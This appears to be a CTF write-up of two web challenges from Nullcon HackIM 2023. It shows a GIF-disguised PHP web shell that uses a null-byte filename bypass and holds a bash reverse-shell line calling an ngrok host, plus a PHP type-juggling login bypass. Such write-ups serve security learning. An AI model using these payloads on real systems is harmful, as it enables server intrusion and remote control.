---
title: Nullcon Goa HackIM CTF 2023
---

# Nullcon Goa HackIM CTF 2023

# Web/Magic Cars

## Challenge Overview

Description: Who doesn't love Magical Cars? go checkout this cool website and even upload your fav gif to support it. Author: @moaath

![Index](./images/nullcon/magic/index.png)

We have been given a website [http://52.59.124.14:10021/](http://52.59.124.14:10021/). We can see three options there. But only gallery seems to be interesting.

So first let's see the source code given.

```php
<?php
error_reporting(0);

$files = $_FILES["fileToUpload"];
$uploadOk = true;

if ($files["name"] != "") {
    $target_dir = urldecode("images/" . $files["name"]);

    if (strpos($target_dir, "..") !== false) {
        $uploadOk = false;
    }

    if (filesize($files["tmp_name"]) > 1 * 1000) {
        $uploadOk = false;
        echo "Too big!!!";
    }

    $extension = strtolower(pathinfo($target_dir, PATHINFO_EXTENSION));
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $type = finfo_file($finfo, $files["tmp_name"]);
    finfo_close($finfo);

    if ($extension != "gif" || strpos($type, "image/gif") === false) {
        echo " Sorry, only gif files are accepted";
        $uploadOk = false;
    }

    $target_dir = strtok($target_dir, chr(0));

    if ($uploadOk && move_uploaded_file($files["tmp_name"], $target_dir)) {
        echo "<a href='$target_dir'>Uploaded gif here. Go see it!</a>";
    }
}
?>
```


## Vulnerability Identification

As we can see the code is checking MIME type when we upload a gif. This leads to file upload vulnerability.

So adding gif header in the file the server can be easily exploited

[Reference](https://book.hacktricks.xyz/pentesting-web/file-upload)


## Exploiting the Vulnerability

So to exploit this we will set the header of the file to **GIF89a**. And then we will inject some php code to exploit the server.

We will name this file as `exploit.php%00.gif`. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.

So to exploit this server we will try to get a shell using **ngrok**

`exploit.php%00.gif` looks like:

```php
GIF89a
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16344 0>&1'");?>
```

## Obtaining the Flag

To retrieve the flag, we will use ngrok to get reverse shell.

After uploading the file when we open it we get the shell.

The flag is located in `/var/www/html` and is named **flag.flag**.

![Flag](./images/nullcon/magic/flag.png) 

Flag: **ENO{4n_uplo4ded_f1l3_c4n_m4k3_wond3r5}**

# Web/TYPicalBoss

## Challenge Overview

Description: My boss just implemented his first PHP website. He mentioned that he managed to calculate a hash that is equal to 0??? I suppose he is not very experienced in PHP yet.
Author: @moaath

![Index](./images/nullcon/typicalboss/index.png)

We have been given a website [http://52.59.124.14:10022/index.php](http://52.59.124.14:10022/index.php). The website includes a basic login page at the route `login.php`, which takes username and password as input.

When we access the main directory '/' of the website, we can see some files:

![Main Directory](./images/nullcon/typicalboss/main.png)

The file that catches our interest is `database.db`. If we open it with a database browser, we can see a list of usernames and their corresponding hashed passwords:

![Database](./images/nullcon/typicalboss/database.png)

## Vulnerability Identification

As we observe the hashed passwords, we notice that password of admin starts with '0e'. This is a common vulnerability in PHP, where the hashed password is interpreted as 0 instead of the actual hash value '0e12345678912345678920202020202020202020'.

## Exploiting the Vulnerability

To exploit this vulnerability, we need to find a value whose SHA-1 hash starts with '0e'. One common technique for this is known as Type Juggling. More details about this technique can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).

For instance, the SHA-1 hash of '10932435112' starts with '0e', so in PHP, it will be interpreted as 0.

## Obtaining the Flag

To retrieve the flag, we need to log in with the username 'admin' and the password '10932435112':

Username: admin
Password: 10932435112

Flag: **ENO{m4ny_th1ng5_c4n_g0_wr0ng_1f_y0u_d0nt_ch3ck_typ35}**

![Flag](./images/nullcon/typicalboss/flag.png)

Thank You
